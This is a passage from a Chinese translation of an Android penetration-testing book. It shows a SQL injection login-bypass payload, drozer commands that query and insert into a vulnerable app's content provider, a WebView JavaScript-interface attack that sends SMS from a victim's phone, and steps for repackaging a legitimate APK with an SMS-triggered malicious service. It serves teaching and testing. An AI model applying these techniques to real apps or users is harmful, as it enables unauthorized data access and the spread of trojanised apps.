用 rawQuery 方法执行。 rawQuery 方法实际上只是执行任何传递给它的 SQL 查询。另一个类
似于 的方法是 方法，它和 一样脆弱。
rawQuery execSQL rawQuery
前面的 SQL 查询用于验证用户的登录凭据，然后显示其在注册期间使用的信息。所以，这里
的 SQL 引擎检查用户名和密码是否匹配在一行，如果是这样，它返回一个布尔值 TRUE 。
然而，想象一个场景，我们可以修改我们的输入，而不是正常的文本输入，它似乎是应用程
序的 SQL 查询的一部分，然后又返回 TRUE ，从而授予我们身份。事实证明，如果我们把用
户名/密码设为 或任何类似总是 的查询，我们就破解了应用程序的身份验证
1'or'1'='1 TRUE
机制，这反过来是一个很大的安全风险。另外，请注意，由于使用单引号，在前面输入中使
用的 将在SQL查询中被视为 。这将闭合用户名字段，并且我们的其余输入将解释为
OR OR
SQL 查询。你可以从 http://attify.com/lpfa/sqlite.apk 下载漏洞应用程序。这里是攻击情
况下的 SQL 查询：
SELECT * FROM USER_RECORDS WHERE USERNAME = '1'or'1'='1' AND
PASSWORD = 'something'
如果应用程序检测到登录成功，它会显示一个弹出框，其中包含用户信息，就像在 SQLite 身
份验证绕过攻击的情况下一样，如下面的屏幕截图所示：
我们还可以在输入结尾处附加双连字符（ - ），来使 SQL 查询的其余部分仅解释为对应用程
序的注释。
让我们看看另一个应用程序，这一次，利用 drozer，我们以前使用的工具，来利用 SQLite 注
入漏洞。
这个应用程序是一个待办事项，用户可以保存他们的笔记; 该笔记存储在名为 的
todotable.db
数据库中，并在应用程序中通过内容供应器访问。 遵循以下步骤：
72
第六章 玩转 SQLite
1. 让我们继续，并启动 drozer，查看这个应用程序的数据库，如下面的命令所示。软件包
名称为 。
com.attify.vulnsqliteapp
adb forward tcp:31415 tcp:31415
drozer console connect
2. 一旦我们进入了 Drozer 的控制台，我们就可以运行 finduri 扫描器模块来查看所有内容
URI 和可访问的 URI，如下所示：
dz> run scanner.provider.finduris -a com.attify.vulnsqliteapp
Scanning com.attify.vulnsqliteapp...
Unable to Query
content://com.attify.vulnsqliteapp.contentprovider/
Able to Query
content://com.attify.vulnsqliteapp.contentprovider/todos
Able to Query
content://com.attify.vulnsqliteapp.contentprovider/todos/
Unable to Query
content://com.attify.vulnsqliteapp.contentprovider
Accessible content URIs:
content://com.attify.vulnsqliteapp.contentprovider/todos
content://com.attify.vulnsqliteapp.contentprovider/todos/
3. 接下来，我们将使用 Drozer 中的注入扫描程序模块检查应用程序中基于注入的漏洞，如
下所示：
dz> run scanner.provider.injection -a com.attify.vulnsqliteapp
Scanning com.attify.vulnsqliteapp...
Not Vulnerable:
content://com.attify.vulnsqliteapp.contentprovider/
content://com.attify.vulnsqliteapp.contentprovider
Injection in Projection:
No vulnerabilities found.
Injection in Selection:
content://com.attify.vulnsqliteapp.contentprovider/todos
content://com.attify.vulnsqliteapp.contentprovider/todos/
4. 所以，现在我们可以使用可选参数来查询这些内容供应器，例如 1 = 1 ，它将在所有情
况下返回 ，如下面的截图所示：
TRUE
5. 此外，我们可以使用 Drozer 模块 app.provider.insert ，并通过指定参数和要更新的数
据类型，将我们自己的数据插入 SQLite 数据库。 让我们假设我们要在数据库中添加另一
个 条目。 因此，我们需要四个字
to-do
73
第六章 玩转 SQLite
段： ， ， 和 ，数据类型分别
id category summary description
为 ， ， 和 。
integer string string string
6. 因此，完整的语法将变成：
run app.provider.insert
content://com.attify.vulnsqliteapp.contentprovider/todos/ -
-integer _id 2 --string category urgent --string summary
"Financial Summary" --string description "Submit Annual
Report"
成功执行后，它将显示完成消息，如以下屏幕截图所示：
总结
在本章中，我们深入了解了 SQLite 数据库，甚至在应用程序中发现了漏洞，并利用 Drozer
来利用它们。 SQLite 数据库应该是渗透测试人员关注的主要问题之一，因为它们包含了应用
程序的大量信息。 在接下来的章节中，我们将了解一些不太知名的 Android 利用技术。
74
第七章 不太知名的 Android 漏洞
第七章 不太知名的 Android 漏洞
作者：Aditya Gupta
译者：飞龙
协议：CC BY-NC-SA 4.0
在本章中，我们将了解一些不太知名的 Android 攻击向量，这在 Android 渗透测试中可能很
有用。 我们还将涵盖一些主题，如 Android 广告库中的漏洞和 WebView 实现中的漏洞。 作为
渗透测试者，本章将帮助你以更有效的方式审计 Android 应用程序，并发现一些不常见的缺
陷。
7.1 Android WebView 漏洞
WebView 是一种 Android 视图，用于在应用程序中显示 Web 内容。 它使用 WebKit 渲染引
擎，以便使用 和 协议显示网页和其他内容，可以用于从文件系统加载文件和
file// data//
数据内容。 WebView 也用于各种 Android 应用程序，例如提供注册和登录功能的应用程序。
它通过在应用程序的布局中构建其移动网站，来显示应用程序中的 Web 内容。 我们将在下一
章中进一步讨论 WebKit 及其渲染引擎。 对于本章，我们将只关心使用 WebKit 的那些应用程
序。
在应用中使用 WebView
在应用程序中使用 非常简单和直接。 假设我们希望我们的整个活动都是一
WebView
个 组件，从 加载内容。
WebView http://examplewebsite.com
下面是在 Android 应用程序中实现 WebView 的代码示例：
WebView webview = new WebView(this);
setContentView(webview);
webview.loadUrl("http://vulnerable-website.com");
另一个重要的事情是，大多数开发人员最终为了增强应用程序的功能，在 实现中使
WebView
用以下命令启用 JavaScript（默认设置为 ）：
False
setJavascriptEnabled(true);
前面的命令确保 JavaScript 可以在应用程序中执行，并利用注册界面。
识别漏洞
75
第七章 不太知名的 Android 漏洞
想象一下这种情况，应用程序在不安全的网络中使用，允许攻击者执行中间人攻击（更多中
间人攻击的内容请参见 OWASP 网
站 ）。 如果攻击者可以访问网络，
https//www.owasp.org/index.php/Man-in-the-middle_attack
则他们可以修改请求和对设备的响应。 这表示他们能够修改响应数据，并且如果从网站加载
JavaScript 内容，则可以完全控制 JavaScript 内容。
事实上，通过使用它，攻击者甚至可以使用 JavaScript 来调用手机上的某些方法，例如向另
一个号码发送短信，拨打电话，甚至使用诸如 Drozer 之类的工具获取远程 shell。
让我们举个简单的例子，来说明 WebView 漏洞的可能性。 在这里，我们将使用 Joshua Drake
的 GitHub 仓库（ https://github.com/jduck/VulnWebView/ ）中的，由他创建的概念证明。 这
个 POC 在应用程序中使用 WebView ，来简单加载一个 URL 并且加载一个位
于 的网页（如果这个链接打不开，你可以访
http://droidsec.org/addjsif.html
问 ）。
http//attify.com/lpfa/addjsif.html
以下是 Eclipse 中代码示例的屏幕截图，其中使用名称 Android 创建 JavaScript 界面：
我们还可以从源代码中创建 文件，只需右键单击项目，然后选
apk
择 Export as an Android Application （导出为 Android 应用程序）。 一旦我们运行应用程序
并监听 Burp 代理中的流量，我们将看到应用程序中指定的 URL 的请求，如以下屏幕截图所
示：
76
第七章 不太知名的 Android 漏洞
现在，当响应来自服务器时，我们可以修改响应数据并使用它来利用此漏洞，如以下屏幕所
示
让我们假设攻击者需要利用这个漏洞应用程序，来使用受害者的设备向一个号码发送短信。
以下屏幕截图显示了修改后的响应的样子：
一旦我们点击 （转发）按钮，邮件将从受害者的设备发送到攻击者指定的号码。
Forward
上述内容简单地调用 SMSManager() ，以便将包含文本 pwned 的 SMS 发送到的预定义号码。
77
第七章 不太知名的 Android 漏洞
这是一个利用存在漏洞的 应用程序的简单示例。 事实上，你可以尝试调用不同的方
WebView
法或使用 Drozer 从设备获取远程 shell。 你还可以访
问
https://labs.mwrinfosecurity.com/blog/2013/09/24/webview-addjavascriptinterface-remote-code-execution/
阅读通过 Drozer 利用 WebView 的更多信息。
7.2 感染合法 APK
由于 Google 的不严格政策，将应用上传到 Play 商店时，许多开发人员上传了恶意应用和软
件，目的是从使用者的装置窃取私人资料。 Google Play 中存在的大多数恶意软件只是合法
应用程序的受感染版本。恶意软件作者只需要一个真正的应用程序，反编译它，插入自己的
恶意组件，然后重新编译它，以便分发到应用商店和感染用户。这可能听起来很复杂，但实
际上，这是一个非常简单的事情。
让我们尝试分析恶意软件作者如何修改合法应用程序，来创建它的受感染版本。执行此操作
的最简单的方法之一是编写一个简单的恶意应用程序，并将其所有恶意活动放在服务中。此
外，我们在 文件中添加广播接收器，以便指定的事件（例如接收 SMS）
AndroidManifest.xml
能够触发我们的服务。
因此，以下是创建受感染版本的合法应用程序的简单步骤：
1. 使用 apktool 解压缩应用程序，如下所示：
apktool d [appname].apk
2. 反编译恶意应用程序来生成 Java 类的 smali 文件。 在这里，我们需要将所有的恶意活动
放在服务中。 此外，如果你有 smali 语言的经验，你可以直接从 smali 本身创建服务。
假设恶意服务的名称是 。
malware.smali
3. 接下来，我们需要将 malware.smali 文件复制到 smali 文件夹，它位于我们反编译的合法
应用程序的文件夹中 。 我们把 中的软件包名称的所有引用更改为合法应
malware.smali
用程序的软件包名称，并在 中注册服务。
AndroidManifest.xml
在这里，我们需要在 文件中添加另一行，如下所示：
AndroidManifest.xml
4. 此外，我们需要注册一个广播接收器来触发服务。 在这种情况下，我们选择短信作为触
发器，如下面的代码所示：
78
第七章 不太知名的 Android 漏洞
5. 使用 apktool 重新编译应用，像这样：
apktool b appname/
一旦应用程序使用 apktool 重新编译，新的 apk 将为被感染的合法版本。 向手机发送邮件可
能会自动触发此恶意软件。 如果恶意软件服务需要的权限比合法应用程序更多，我们还需要
手动在 文件中添加缺少的权限。
AndroidManifest.xml